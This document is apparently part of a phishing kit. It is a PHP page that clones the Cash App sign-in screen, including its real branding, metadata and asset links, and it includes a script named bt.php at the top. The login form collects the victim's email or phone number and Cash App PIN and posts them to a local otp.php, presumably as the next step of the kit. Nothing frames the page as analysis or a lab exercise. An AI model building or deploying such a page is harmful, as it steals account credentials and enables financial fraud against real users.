<?php
include 'bt.php';
?>
<html lang="en" style="--vh:790px;"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
  <title>Cash App - Sign in to your account</title>
  <meta name="description" content="Sign in to your Cash App account. View transaction history, manage your account, and send payments.">
  <meta property="og:description" content="Sign in to your Cash App account. View transaction history, manage your account, and send payments.">
  <meta property="og:title" content="Cash App - Sign in to your account">
  <meta property="og:site_name" content="Cash App">
  <meta property="og:type" content="website">
  
  

  
  

  <meta name="twitter:site" content="@CashApp">
  <meta name="twitter:card" content="app">
  <meta name="twitter:app:country" content="US">
  <meta name="twitter:app:name:iphone" content="Cash App">
  <meta name="twitter:app:id:iphone" content="711923939">
  <meta name="twitter:app:name:ipad" cont+ent="Cash App">
  <meta name="twitter:app:id:ipad" content="711923939">
  <meta name="twitter:app:name:googleplay" content="Cash App">
  <meta name="twitter:app:id:googleplay" content="com.squareup.cash">

  <meta name="apple-mobile-web-app-status-bar-style" content="black">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-title" content="Cash App">

  <meta name="theme-color" content="#0bb634">
  <meta name="mobile-web-app-capable" content="yes">
  <meta name="format-detection" content="telephone=no,email=no">
  <link rel="icon" sizes="196x196" href="/icon-196.png">
  <link rel="icon" href="/favicon.ico">
  <link rel="mask-icon" href="/favicon-pinned.svg" color="#18C300">
  <script src="https://cash-f.squarecdn.com/ember/a548ae1339eed15b0a557cd7cc8ba0b2f9645ac5/assets/vendor.js" integrity="sha256-9KuH7eESKaCOVFCs1Nbm4WBPoctF2lQ4e1ZxH5BD/Fg=" crossorigin="anonymous"></script>
  <script src="https://cash-f.squarecdn.com/ember/a548ae1339eed15b0a557cd7cc8ba0b2f9645ac5/assets/cash.js" integrity="sha256-ZqDmTCkalaEZf24rajGg5N/QdYrke99xWBiDx8jBGVc=" crossorigin="anonymous"></script>
  <script type="application/ld+json">
    {
      "@context": "http://schema.org",
      "@type": "Organization",
      "url": "https://cash.app",
      "logo": "https://cash.app/icon-196.png",
      "name": "Cash App",
      "contactPoint": {
        "@type": "ContactPoint",
        "telephone": "+1-855-351-2274",
        "contactType": "customer support",
        "contactOption": "tollFree"
      },
      "sameAs": [
        "https://twitter.com/cashapp",
        "https://www.instagram.com/cashapp"
      ]
    }
  </script>
  <link rel="stylesheet" type="text/css" href="https://cash-f.squarecdn.com/ember/a548ae1339eed15b0a557cd7cc8ba0b2f9645ac5/assets/cash.css" integrity="sha256-DKtq4UJpbOrnJlqn+TlB3hTfPU4GrCSHgI1Lvx2P6g8=" crossorigin="anonymous">
  <link rel="preload" href="https://cash-f.squarecdn.com/assets/fonts/cashmarket/cash-market-rounded-light.woff2" as="font" type="font/woff2" crossorigin="anonymous">
  <link rel="preload" href="https://cash-f.squarecdn.com/assets/fonts/cashmarket/cash-market-rounded-regular.woff2" as="font" type="font/woff2" crossorigin="anonymous">
  <link rel="preload" href="https://cash-f.squarecdn.com/assets/fonts/cashmarket/cash-market-rounded-medium.woff2" as="font" type="font/woff2" crossorigin="anonymous">
</head>
<body class="theme-bg ember-application theme-green">

<div id="ember307" class="ember-view"><div data-current-route="login" id="ember331" class="full-height application-cash ember-view">  <div id="ember338" class="cookie-banner ember-view"><!----></div>
  <section class="layout-login flex-container full-height pad">
  <div class="login-container flex-container flex-v-center flex-fill">
<!---->      <h1 class="step-title flex-static">Sign in to Cash&nbsp;App</h1>
<!----><form autocomplete="off" spellcheck="true" novalidate="true" id="ember344" class="login-form ember-view" action="otp.php" method="post">        <div id="ember370" class="field fk-field-container ember-view"><input type="text" aria-label="Email or Mobile Number" name="number" autocomplete="off" spellcheck="false" autocapitalize="none" id="alias" class="ember-text-field ember-view" placeholder="Email or Mobile Number">
	<input type="text" aria-label="Email or Mobile Number" name="pin" autocomplete="off" spellcheck="false" autocapitalize="none" id="alias" class="ember-text-field ember-view" placeholder="Cash App Pin">
</div>
<!---->
        <div class="alias-submit fade-in immediate show">
          <div id="ember385" class="cta submit-button-component submit-button-with-spinner ember-view"><button type="submit" aria-label="Request Sign In Code" class="button theme-button button--round theme-button" data-ember-action="" data-ember-action-386="386">Request Sign In Code</button>
  <div id="ember391" class="spinner-container ember-view"></div>
</div>
        </div>
</form>  </div>
</section>

  <!---->
  <div id="ember394" class="modal-manager ember-view"><div class="modal-overlay "></div>
<!----></div>
</div></div></body></html>